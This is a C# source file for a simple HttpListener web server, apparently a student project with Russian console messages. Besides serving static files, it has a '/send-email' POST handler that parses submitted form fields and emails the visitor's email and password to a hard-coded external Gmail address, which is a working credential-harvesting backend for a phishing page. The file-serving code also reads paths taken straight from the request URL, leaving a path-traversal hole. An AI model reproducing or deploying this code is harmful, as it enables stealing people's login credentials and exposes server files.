using System.Net;
using System.Text;
using MyHTTPServer.Services;

namespace MyHTTPServer;

public static class ServerManager
{
    private static string _errorPage = @"<!DOCTYPE html>
    <html>
        <head>
            <meta charset='utf-8'>
            <title>Not Found</title>
        </head>
        <body>
            <h1>404 файл не найден</h1>
        </body>
    </html>";
    public static void Run()
    {
        CancellationTokenSource cancelTokenSource = new CancellationTokenSource();
        CancellationToken token = cancelTokenSource.Token;
        
        Task task = new Task(ServerLoop, token);
        task.Start();
        
        while (true)
        {
            var input = Console.ReadLine();
            if (input == "stop")
            {
                cancelTokenSource.Cancel();
                break;
            }
        }   
        
        async void ServerLoop()
        {
            HttpListener server = new HttpListener();
        
            try
            {
                var config = ConfigLoader.Config;
                
                server.Prefixes.Add($"{config.Address}:{config.Port}/");
                server.Start(); 
                Console.WriteLine("Сервер запущен");
                
                while (true)
                {
                    if (token.IsCancellationRequested)
                    {
                        server.Stop();
                        Console.WriteLine("Сервер завершил работу");
                        break;
                    }
                    var context = await server.GetContextAsync();
                    var desiredPath = config.StaticFilesPath + context.Request.Url.AbsolutePath;
                    var response = context.Response;
                    var request = context.Request;
                    byte[] contentBytes;

                    if (request.HttpMethod.Equals("Post", StringComparison.OrdinalIgnoreCase) && request.Url.AbsolutePath == "/send-email")
                    {
                        var stream = new StreamReader(request.InputStream);
                        var input = await stream.ReadToEndAsync();

                        var sender = ConfigLoader.EmailSender;
                        Console.WriteLine(input);
                        string[] parsedInput = input.Split(new [] {'&', '='});
                        await sender.SendEmailAsync("eminsarux.rik79@gmail.com", "test", 
                            $"email: {parsedInput[1]}, password: {parsedInput[3]}");
                    }
                    
                    if (desiredPath == "static/" || desiredPath == "static/send-email")
                        contentBytes = File.ReadAllBytes($"./{config.StaticFilesPath}/index.html");
                    
                    else if (desiredPath.EndsWith(".html"))
                    {
                        if (File.Exists(desiredPath))
                            contentBytes = File.ReadAllBytes($"./{desiredPath}");
                        else
                            contentBytes = Encoding.UTF8.GetBytes(_errorPage);
                        response.ContentEncoding = Encoding.UTF8;
                    }
                    else if (desiredPath.EndsWith(".ico"))
                        contentBytes = new byte[] {};
                    else if (desiredPath.EndsWith(".svg"))
                    {
                        contentBytes = File.ReadAllBytes(desiredPath);
                        response.ContentType = "image/svg+xml";
                    }
                    else
                    {
                        contentBytes = File.ReadAllBytes(desiredPath);
                    }
                    
                    response.ContentLength64 = contentBytes.Length;
                    using Stream output = response.OutputStream;
                        
                    await output.WriteAsync(contentBytes);
                    await output.FlushAsync();
        
                    Console.WriteLine("Запрос обработан");
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {
                Console.WriteLine("Работа сервера завершена");
            }
        }
    }
}